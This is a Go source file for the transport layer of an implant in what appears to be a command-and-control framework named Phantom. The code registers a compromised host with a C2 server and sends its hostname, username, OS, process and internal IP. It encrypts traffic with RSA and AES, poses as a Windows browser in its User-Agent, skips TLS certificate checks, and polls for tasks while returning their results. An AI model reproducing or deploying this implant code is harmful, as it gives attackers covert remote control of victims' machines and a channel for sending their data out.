package implant

import (
	"bytes"
	"crypto/rsa"
	"crypto/tls"
	"encoding/json"
	"io"
	"net/http"
	"time"

	"github.com/phantom-c2/phantom/internal/crypto"
	"github.com/phantom-c2/phantom/internal/protocol"
)

// Transport handles HTTP(S) communication with the C2 server.
type Transport struct {
	serverURL  string
	client     *http.Client
	sessionKey []byte
	serverPub  *rsa.PublicKey
	agentID    string
	agentName  string
	userAgent  string
}

// NewTransport creates a new HTTP transport.
func NewTransport(serverURL string, serverPub *rsa.PublicKey) *Transport {
	return &Transport{
		serverURL: serverURL,
		serverPub: serverPub,
		userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
		client: &http.Client{
			Timeout: 30 * time.Second,
			Transport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // Accept self-signed certs
				},
			},
		},
	}
}

// Register performs the initial key exchange and registration with the server.
func (t *Transport) Register(sysinfo SysInfo) error {
	// Generate session key
	sessionKey, err := crypto.GenerateAESKey()
	if err != nil {
		return err
	}

	// Build registration request
	regReq := protocol.RegisterRequest{
		Hostname:    sysinfo.Hostname,
		Username:    sysinfo.Username,
		OS:          sysinfo.OS,
		Arch:        sysinfo.Arch,
		PID:         sysinfo.PID,
		ProcessName: sysinfo.ProcessName,
		InternalIP:  sysinfo.InternalIP,
	}

	payload, err := protocol.Marshal(regReq)
	if err != nil {
		return err
	}

	// RSA encrypt session key + payload
	encrypted, err := crypto.PackKeyExchange(t.serverPub, sessionKey, payload)
	if err != nil {
		return err
	}

	// Wrap in registration envelope
	env := &protocol.Envelope{
		Version: protocol.ProtocolVersion,
		Type:    protocol.MsgRegisterRequest,
		Payload: encrypted,
	}

	// Send HTTP request
	respBody, err := t.sendEnvelope("/api/v1/auth", env)
	if err != nil {
		return err
	}

	// Parse response
	respEnv, err := protocol.UnwrapFromHTTP(respBody)
	if err != nil {
		return err
	}

	// Decrypt with our session key
	respPayload, err := protocol.OpenEnvelope(respEnv, sessionKey)
	if err != nil {
		return err
	}

	var regResp protocol.RegisterResponse
	if err := protocol.Unmarshal(respPayload, &regResp); err != nil {
		return err
	}

	// Store session state
	t.sessionKey = sessionKey
	t.agentID = regResp.AgentID
	t.agentName = regResp.Name

	return nil
}

// CheckIn sends a check-in with optional task results and receives new tasks.
func (t *Transport) CheckIn(results []protocol.TaskResult) ([]protocol.Task, error) {
	// Build check-in request
	checkIn := protocol.CheckInRequest{
		AgentID: t.agentID,
		Results: results,
	}

	payload, err := protocol.Marshal(checkIn)
	if err != nil {
		return nil, err
	}

	// Encrypt with session key
	env, err := protocol.SealEnvelope(protocol.MsgCheckIn, t.sessionKey, payload)
	if err != nil {
		return nil, err
	}

	// Send
	respBody, err := t.sendEnvelope("/api/v1/status", env)
	if err != nil {
		return nil, err
	}

	// Parse response
	respEnv, err := protocol.UnwrapFromHTTP(respBody)
	if err != nil {
		return nil, err
	}

	// Decrypt
	respPayload, err := protocol.OpenEnvelope(respEnv, t.sessionKey)
	if err != nil {
		return nil, err
	}

	var checkInResp protocol.CheckInResponse
	if err := protocol.Unmarshal(respPayload, &checkInResp); err != nil {
		return nil, err
	}

	return checkInResp.Tasks, nil
}

// sendEnvelope wraps an envelope in HTTP JSON and POSTs it.
func (t *Transport) sendEnvelope(path string, env *protocol.Envelope) ([]byte, error) {
	httpBody, err := protocol.WrapForHTTP(env, time.Now().Unix())
	if err != nil {
		return nil, err
	}

	url := t.serverURL + path
	req, err := http.NewRequest("POST", url, bytes.NewReader(httpBody))
	if err != nil {
		return nil, err
	}

	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", t.userAgent)

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return io.ReadAll(io.LimitReader(resp.Body, 10<<20)) // 10MB limit
}

// GetAgentID returns the assigned agent ID.
func (t *Transport) GetAgentID() string {
	return t.agentID
}

// GetAgentName returns the assigned agent name.
func (t *Transport) GetAgentName() string {
	return t.agentName
}

// wrapRegistrationForHTTP creates a JSON wrapper for the registration envelope.
func wrapRegistrationForHTTP(env *protocol.Envelope) ([]byte, error) {
	raw := protocol.EnvelopeToBytes(env)
	wrapper := protocol.HTTPWrapper{
		Data:      crypto.Base64Encode(raw),
		Timestamp: time.Now().Unix(),
	}
	return json.Marshal(wrapper)
}
